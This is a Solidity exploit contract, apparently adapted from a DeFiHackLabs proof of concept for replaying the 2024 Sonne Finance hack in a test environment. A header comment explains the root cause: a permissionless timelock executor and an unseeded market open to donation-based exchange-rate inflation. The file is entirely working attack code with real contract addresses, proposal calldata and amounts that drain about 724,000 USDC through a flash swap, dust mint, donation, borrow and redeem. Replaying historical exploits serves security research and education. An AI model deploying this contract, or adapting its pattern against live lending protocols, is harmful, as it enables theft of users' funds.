// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-05-Sonne).
//
// The DeFiHackLabs PoC runs the ENTIRE attack inline in the Foundry test
// contract `ContractTest` (attacker == address(this); the Velodrome
// flash-swap callback `hook()` lives on the test contract itself). There is
// no standalone exploit contract to deploy from the Foundry artifact, so
// this file faithfully copies `testExploit()` + `hook()` into a
// self-contained `run()` entrypoint + `hook()` callback, verbatim in logic
// and constants (see test/Sonne_exp.sol in the registry folder).
//
// Root cause: Sonne's soVELO market (a CompoundV2 fork market) was listed by
// governance but never seeded — totalSupply == 0, cash == 0 at the exploit
// block. Because the Timelock's EXECUTOR_ROLE is granted to address(0), the
// governance proposal to list+configure soVELO (queued, delay elapsed) can
// be executed by ANYONE. The attacker executes it themselves, then in the
// same transaction: flash-swaps ~35.47M VELO from a Velodrome pool, mints a
// dust amount of soVELO (2 wei, exchange rate initialized to 2e26), donates
// the entire flash-swapped VELO directly to the market (inflating `cash` and
// therefore the exchange rate to ~1.77e43), borrows ~768,947 USDC against
// the now-astronomically-valued 2-wei collateral, redeems the donation back
// (redeemUnderlying rounds DOWN, burning only 1 of the 2 cToken wei), repays
// the flash-swap + fee, and nets the borrowed USDC minus the flash fee as
// profit (~724,290 USDC).

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface TimelockController {
    function execute(
        address target,
        uint256 value,
        bytes memory data,
        bytes32 predecessor,
        bytes32 salt
    ) external payable;
}

interface VolatileV2Pool {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
}

interface CErc20Interface {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface ICErc20Delegate {
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
}

contract SonneDrain {
    address internal constant soVELO = 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5;
    address internal constant soUSDC = 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F;
    address internal constant Unitroller = 0x60CF091cD3f50420d50fD7f707414d0DF4751C58;
    address internal constant VELO_Token_V2 = 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db;
    address internal constant USDC = 0x7F5c764cBc14f9669B88837ca1490cCa17c31607;
    address internal constant VolatileV2_USDC_VELO = 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5;

    TimelockController internal constant t = TimelockController(0x37fF10390F22fABDc2137E428A6E6965960D60b6);

    /// @notice Recorded attack entrypoint. Mirrors `testExploit()` verbatim:
    ///         execute 5 queued/permissionless governance proposals to list +
    ///         configure the empty soVELO market, approve VELO to soVELO, then
    ///         flash-swap VELO from the Velodrome pool (which calls `hook()`
    ///         back on this contract to run the actual donation attack).
    function run() external {
        // 1. Execute proposals
        bytes memory data1 = hex"fca7820b0000000000000000000000000000000000000000000000000429d069189e0000";
        bytes memory data2 = hex"f2b3abbd0000000000000000000000007320bd5fa56f8a7ea959a425f0c0b8cac56f741e";
        bytes memory data3 = hex"55ee1fe100000000000000000000000022c7e5ce392bc951f63b68a8020b121a8e1c0fea";
        bytes memory data4 = hex"a76b3fda000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe5";
        bytes memory data5 =
            hex"e4028eee000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe500000000000000000000000000000000000000000000000004db732547630000";

        t.execute(
            soVELO,
            0,
            data1,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x476d385370ae53ff1c1003ab3ce694f2c75ebe40422b0ba11def4846668bc84c
        );

        t.execute(
            soVELO,
            0,
            data2,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0xa57973a3d5a5d99d454c54117d7d30a57a8aca089891f505f120174216edaf42
        );

        t.execute(
            Unitroller,
            0,
            data3,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0x42408274449fd7829d7fb6abe2e89a618a853acf68d1553b2f6b8b671ac443fd
        );

        t.execute(
            Unitroller,
            0,
            data4,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0xb02c80e66eae74aef841e5d998aef03d201de66590950b6353e9a28b289c8c8b
        );

        t.execute(
            Unitroller,
            0,
            data5,
            0x0000000000000000000000000000000000000000000000000000000000000000,
            0xe50459992a5c9678d53efbffbf6b95687111e5789dada996e41fea2986077bed
        );

        // 2. Approve VELO to soVELO
        IERC20(VELO_Token_V2).approve(soVELO, type(uint256).max);

        // 3. FlashLoan (flash-swap VELO from the Velodrome pool; triggers hook())
        VolatileV2Pool(VolatileV2_USDC_VELO).swap(0, 35_469_150_965_253_049_864_450_449, address(this), hex"01");
    }

    /// @notice Velodrome flash-swap callback. Mirrors `hook()` verbatim: mint
    ///         dust soVELO, donate the flash-swapped VELO directly to the
    ///         market to inflate its exchange rate, borrow USDC against the
    ///         now-overvalued collateral, redeem the donation back (rounds
    ///         down in the attacker's favor), repay the flash-swap + fee, and
    ///         keep the leftover USDC as profit.
    function hook(address, uint256, uint256 amount1, bytes calldata) external {
        // 4. Mint 2 wei soVELO
        CErc20Interface(soVELO).mint(400_000_001);

        // 5. Transfer all VELO_Token_V2 to soVELO (the donation)
        uint256 veloAmountOfThis = IERC20(VELO_Token_V2).balanceOf(address(this));
        IERC20(VELO_Token_V2).transfer(soVELO, veloAmountOfThis);

        uint256 veloAmountOfSoVeloAfterTransfer = IERC20(VELO_Token_V2).balanceOf(soVELO);

        // 6. Enter Market
        address[] memory cTokens = new address[](2);
        cTokens[0] = soUSDC;
        cTokens[1] = soVELO;
        IUnitroller(Unitroller).enterMarkets(cTokens);

        CErc20Interface(soUSDC).borrow(768_947_220_961);

        // 7. Redeem
        ICErc20Delegate(soVELO).redeemUnderlying(veloAmountOfSoVeloAfterTransfer - 1);

        // 9. Repay FlashLoan (VELO)
        IERC20(VELO_Token_V2).transfer(VolatileV2_USDC_VELO, amount1 - 1);

        // 10. Repay FlashLoan Fee with USDC
        IERC20(USDC).transfer(VolatileV2_USDC_VELO, 44_656_863_632);

        // 11. Profit left in this contract as USDC (measured via profitReceiver="exploit").
    }
}
